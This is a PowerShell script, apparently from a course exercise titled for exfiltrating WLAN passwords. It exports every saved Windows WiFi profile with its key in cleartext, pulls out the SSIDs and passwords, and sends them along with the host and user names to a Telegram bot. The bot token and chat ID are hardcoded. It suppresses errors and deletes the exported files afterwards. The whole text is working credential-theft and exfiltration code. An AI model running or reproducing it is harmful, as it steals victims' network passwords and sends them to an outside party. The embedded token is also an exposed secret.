# ============================================================
#  W02a.6 – WLAN-Passwörter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        $enc      = [System.Text.Encoding]::UTF8
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $CRLF     = "`r`n"
        $header   = $enc.GetBytes(
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"chat_id`"$CRLF$CRLF$CHAT_ID$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"caption`"$CRLF$CRLF$Caption$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$Filename`"$CRLF" +
            "Content-Type: text/plain; charset=utf-8$CRLF$CRLF"
        )
        $body = $header + $enc.GetBytes($Content) + $enc.GetBytes("$CRLF--$boundary--$CRLF")
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" `
            -Method POST `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $body | Out-Null
    } catch { }
}

# ── WLAN-Passwörter sammeln ───────────────────────────────────

Send-TgMessage "🔑 [WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"

Push-Location $env:TEMP
try {
    netsh wlan export profile key=clear | Out-Null

    $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
                 ForEach-Object {
                     $ssid = $_.Filename -replace "Wi-Fi-|\.xml", ""
                     $pass = $_.Matches.Groups[1].Value
                     "SSID: $ssid  |  Passwort: $pass"
                 }

    if (-not $passwords) { $passwords = @("(keine WLAN-Profile mit Passwort gefunden)") }

    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
              ($passwords -join "`n")

    Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
                -Content $report `
                -Caption "📶 WiFi Passwords – $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
} finally {
    Remove-Item "Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue
    Pop-Location
}
